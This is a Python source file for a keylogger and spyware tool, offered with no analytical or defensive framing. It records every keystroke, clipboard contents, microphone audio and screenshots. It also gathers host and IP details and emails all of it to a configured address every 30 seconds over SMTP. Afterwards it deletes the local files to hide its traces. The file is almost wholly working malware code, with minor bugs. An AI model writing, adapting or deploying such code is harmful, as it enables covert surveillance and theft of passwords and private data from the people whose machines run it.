#!/usr//bin/python3

try:
    from email.message import EmailMessage
    import imghdr
    import smtplib
    from  threading import Thread ,Timer
    import socket
    import platform
    import os
    import time
    import pyperclip as pc
    from pynput.keyboard import Key,Listener
    from scipy.io.wavfile import write
    import sounddevice as sd
    from requests import get
    from PIL import ImageGrab


except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyperclip","sounddevice","pynput","imghdr","scipy"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    keys_information="key_log.txt"
    system_information="systeminfo.txt"
    clipboard_information="clipboard.txt"
    audio_information="audio.wav"
    screenshot_information="image.png"

    microphone_time=10

    email_address=" "
    password=" "
    toaddr=" "
    file_path=os.path.dirname(os.path.abspath(__file__))+'/'
    time_to_send_report=30

    def send_mail(toaddr):
        
        fromaddr=email_address
        msg=EmailMessage()

        msg['From']=fromaddr
        msg['To']=toaddr
        msg['Subject']="Log File"
        msg.set_content("Log Data")
        files=["key_log.txt","systeminfo.txt","clipboard.txt"]
        for file in files:
            with open(file,'rb')as f:
                file_data=f.read()
                file_name=f.name
            msg.add_attachment(file_data,maintype="application", subtype="octet-stream", filename=file_name)
        
        with open("image.png","rb") as f:
            file_data=f.read()
            file_type=imghdr.what(f.name)
            filename=f.name
        msg.add_attachment(file_data,maintype="image",subtype=file_type,filename=filename)
        
        with open("audio.wav","rb") as f:
            file_data=f.read()
            file_name=f.name
        msg.add_attachment(file_data,maintype="audio",subtype="octet-stream",filename=file_name)

        try:
            s=smtplib.SMTP('smtp-mail.outlook.com',587)
            s.starttls()
            s.login(fromaddr,password)
            text=msg.as_string()
            s.sendmail(fromaddr,toaddr,text)
            print("Mail was sent sucessfully")
        except smtplib.SMTPException:
            print("Mail was not sent sucessfully")
        s.quit()

    def computer_information():
        with open(file_path+system_information,"a") as f:
            hostname=socket.gethostname()
            IPAddr=socket.gethostbyname(hostname)
            try:
                public_ip=get('https://api.ipify.org').text
                f.write("Public IP Address: "+public_ip+"\n")
            except Exception:
                f.write("couldnt get public Ip Address")
            f.write("Processor: "+ platform.processor()+'\n')
            f.write("System: "+platform.system()+" "+platform.version()+"\n")
            f.write("Machine: "+platform.machine()+"\n")
            f.write("HostName: "+hostname+"\n")
            f.write("Private IP Address: "+IPAddr+"\n")
    computer_information()


    def copy_clipboard():
        with open(file_path+clipboard_information,"a") as f:
            try:
                clip_data=pc.paste()
                f.write("Clipboard Data:\n"+clip_data)
            except:
                f.write("Clipboard Error")


    def microphone():
        freq=44100
        seconds=microphone_time
        audiorecording=sd.rec(int(seconds*freq),samplerate=freq,channels=2,blocking=True)
        sd.wait()
        write(file_path+audio_information,freq,audiorecording)


    def screenshot():
        im=ImageGrab.grab()
        im.save(file_path+screenshot_information)


    def report():  
        # This code runs every <time_to_send_report> time
        screenshot()
        copy_clipboard()
        send_mail(toaddr)
        timer = Timer(time_to_send_report, function=report)
        timer.daemon=True
        timer.start()
    

    count=0
    keys=[]

    def on_press(key):
        global keys,count
        
        print(key)
        keys.append(key)
        count+=1
        if count>=1:
            count=0
            write_file(keys)
            keys=[]


    def write_file(keys):
        with open(file_path+keys_information,"a") as f:
            for key in keys:
                k=str(key).replace("'","")
                if k.find("space")>0:
                    f.write(" ")
                    f.close()
                elif k.find("enter")>0:
                    f.write("[Enter]\n")
                    f.close()
                elif k.find('decimal')>0:
                    f,write('.')
                elif k.find("ctrl")>0:
                    f.write('[CTRL]')
                    f.close()
                elif k.find("key")==-1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            sd.stop()
            return False
    

    current_time=time.time()
    end_time=time.time()+3
        
        
    while(current_time<end_time):
        with Listener(on_press=on_press,on_release=on_release) as listener :
            listener.join()
        thread1=Thread(target=microphone)
        thread1.start()
        thread1.join()
        report()

    #time for deletion
    time.sleep(120)

    # Delete files 
    delete_files = [system_information, audio_information, clipboard_information, screenshot_information, keys_information]
    for file in delete_files:
        os.remove(file_path +file)

    